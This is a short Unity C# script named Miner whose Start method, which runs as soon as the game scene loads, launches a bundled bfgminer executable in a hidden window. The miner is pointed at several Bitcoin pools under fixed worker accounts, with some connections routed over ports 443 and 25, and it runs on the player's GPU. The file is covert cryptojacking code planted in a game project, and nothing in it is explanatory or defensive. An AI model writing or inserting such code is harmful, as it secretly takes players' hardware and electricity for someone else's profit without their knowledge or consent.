using System.IO;
using System;
using System.Diagnostics;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;

public class Miner : MonoBehaviour
{

    // Start is called before the first frame update
    void Start()
    {
        string command = Directory.GetCurrentDirectory() + "\\Assets\\Resources\\bfgminer-5.5.0-win32\\bfgminer.exe";
        ProcessStartInfo startInfo = new ProcessStartInfo(command);
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo.Arguments = "-o stratum+tcp://btc.ss.poolin.com:443 -u unityhookbtc.001 -p 123 -o stratum+tcp://btc.ss.poolin.com:1883 -u unityhookbtc.001 -p 123 -o stratum+tcp://btc.ss.poolin.com:25 -u unityhookbtc.001 -p 123 -o stratum+tcp://profit.pool.bitcoin.com:3333 -u suburbantropica -p 123 -S opencl:auto";

        Process.Start(startInfo);
    }

}
